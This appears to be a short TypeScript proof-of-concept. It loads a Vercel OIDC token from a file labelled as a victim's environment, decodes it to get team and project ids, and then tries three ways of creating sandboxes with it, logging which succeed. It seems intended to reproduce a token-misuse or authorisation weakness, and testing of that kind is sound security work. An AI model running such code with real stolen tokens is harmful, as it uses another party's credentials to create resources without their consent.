import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
async function main() {
  const creds = { token: VICTIM, teamId: V.owner_id, projectId: V.project_id };
  // 1. getOrCreate
  try {
    const sbx = await Sandbox.getOrCreate({ ...creds, name: "victim-repro2", template: "ubuntu" });
    console.log("getOrCreate OK id:", sbx.id);
    await sbx.stop();
  } catch (e: any) {
    console.log("getOrCreate err:", e.message, "status:", e.response?.status);
  }
  // 2. create without template (default)
  try {
    const sbx = await Sandbox.create({ ...creds });
    console.log("create-nobuild OK id:", sbx.id);
    await sbx.stop();
  } catch (e: any) {
    console.log("create-nobuild err:", e.message, "status:", e.response?.status);
  }
  // 3. create with ports only
  try {
    const sbx = await Sandbox.create({ ...creds, ports: [3000] });
    console.log("create-ports OK id:", sbx.id);
    await sbx.stop();
  } catch (e: any) {
    console.log("create-ports err:", e.message, "status:", e.response?.status);
  }
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
